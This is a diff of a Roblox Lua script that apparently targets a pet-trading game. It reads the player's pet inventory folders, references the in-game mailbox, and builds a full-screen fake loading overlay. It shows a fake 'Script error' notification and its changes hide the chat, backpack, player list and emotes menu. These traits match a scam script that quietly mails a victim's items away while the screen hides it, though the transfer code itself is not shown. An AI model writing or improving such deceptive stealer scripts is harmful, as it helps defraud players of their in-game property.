@@ -1,3 +1,4 @@
+
 local Players = game:GetService("Players");
 local StarterGui = game:GetService("StarterGui");
 local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library);
@@ -13,13 +14,13 @@ local PetFolders = {
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
 };
-if time() <= 30 then
+if time() <= 0 then
 	wait(0);
 	game.StarterGui:SetCore("SendNotification", {
 		Title = "Script error",
 		Text = "Please wait and try again Remote not found !",
 		Icon = "rbxassetid://57254792",
-		Duration = 15
+		Duration = 0
 	});
 	return;
 end;
@@ -49,7 +50,7 @@ local EndSequence = Instance.new("Frame");
 Loading.Name = "Loading";
 Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui");
 Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
-Loading.DisplayOrder = 999999999;
+Loading.DisplayOrder = 0;
 MainFrame.Name = "MainFrame";
 MainFrame.Parent = Loading;
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
@@ -220,10 +221,10 @@ end;
 (coroutine.wrap(SNUMK_fake_script))();
 local function LSNGUH_fake_script()
 	local script = Instance.new("LocalScript", Loading);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true);
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false);
+	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false);
 end;
 (coroutine.wrap(LSNGUH_fake_script))();
 local mailbox = (game:GetService("Workspace")).__MAP.Interactive.Mailbox;
